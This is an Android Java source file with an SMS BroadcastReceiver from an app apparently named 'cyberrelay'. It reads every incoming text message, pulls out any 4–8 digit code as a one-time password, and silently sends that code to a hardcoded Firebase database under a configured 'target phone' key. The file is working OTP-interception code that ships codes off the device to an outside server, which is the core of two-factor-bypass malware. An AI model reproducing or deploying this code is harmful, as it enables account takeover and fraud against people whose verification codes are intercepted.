package com.gvcw.cyberrelay;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SmsReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        SharedPreferences prefs = context.getSharedPreferences("GVCW_CONFIG", Context.MODE_PRIVATE);
        String firebaseUrl = prefs.getString("firebase_url", "https://gvcw-otp-fecher-app-default-rtdb.firebaseio.com");
        String targetPhone = prefs.getString("target_phone", "");

        if (targetPhone.isEmpty()) return;

        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                    String messageBody = sms.getMessageBody();

                    Pattern pattern = Pattern.compile("\\b\\d{4,8}\\b");
                    Matcher matcher = pattern.matcher(messageBody);

                    if (matcher.find()) {
                        String otpCode = matcher.group(0);
                        sendOtpToFirebase(firebaseUrl, targetPhone, otpCode);
                    }
                }
            }
        }
    }

    private void sendOtpToFirebase(final String firebaseUrl, final String targetPhone, final String otp) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    URL url = new URL(firebaseUrl + "/otps/" + targetPhone + ".json");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("PUT");
                    conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                    conn.setDoOutput(true);

                    String jsonInputString = "{\"otp\": \"" + otp + "\", \"timestamp\": " + System.currentTimeMillis() + "}";

                    try (OutputStream os = conn.getOutputStream()) {
                        byte[] input = jsonInputString.getBytes("utf-8");
                        os.write(input, 0, input.length);
                    }

                    conn.getResponseCode();
                    conn.disconnect();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
}